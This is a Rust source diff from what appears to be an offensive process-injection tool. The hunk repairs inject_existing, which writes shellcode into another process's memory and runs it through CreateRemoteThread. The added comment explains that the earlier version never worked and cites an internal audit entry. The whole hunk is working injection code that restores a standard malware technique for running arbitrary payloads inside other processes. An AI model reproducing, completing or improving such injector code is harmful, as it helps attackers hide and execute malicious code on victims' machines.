@@ -1053,14 +1053,26 @@ unsafe fn inject_existing(pid: u32, shellcode: &[u8]) -> Result<(), &'static str
         return Err("remote write failed");
     }
 
-    // 3. CreateRemoteThread on the shellcode address.
+    // 3. CreateRemoteThread with lpStartAddress = shellcode base.
+    //
+    //    v0.3.0 passed None for lpStartAddress and the shellcode address as
+    //    lpParameter (arg 5) — the kernel rejects a NULL start address and the
+    //    call always returned NULL, so the primary existing-process inject path
+    //    was 100% broken (always hit the 'CreateRemoteThread failed' arm).
+    //    CRITICAL-14 in docs/audits/FULL_CODE_AUDIT_2026-07-21.md.
+    //
+    //    Fix mirrors the working remote_load_library pattern at inject.rs:331:
+    //    wrap a transmuted function pointer in Some(...) for arg 4, pass null
+    //    for arg 5 (our shellcode takes no parameter).
+    type ThreadProc = unsafe extern "system" fn(*mut c_void) -> u32;
+    let start_proc: ThreadProc = unsafe { core::mem::transmute(remote_base) };
     let h_thread = unsafe {
         crt(
             h_proc,
             core::ptr::null_mut(),
             0,
-            None,
-            remote_base as *mut c_void,
+            Some(start_proc),
+            core::ptr::null_mut(),
             0,
             core::ptr::null_mut(),
         )
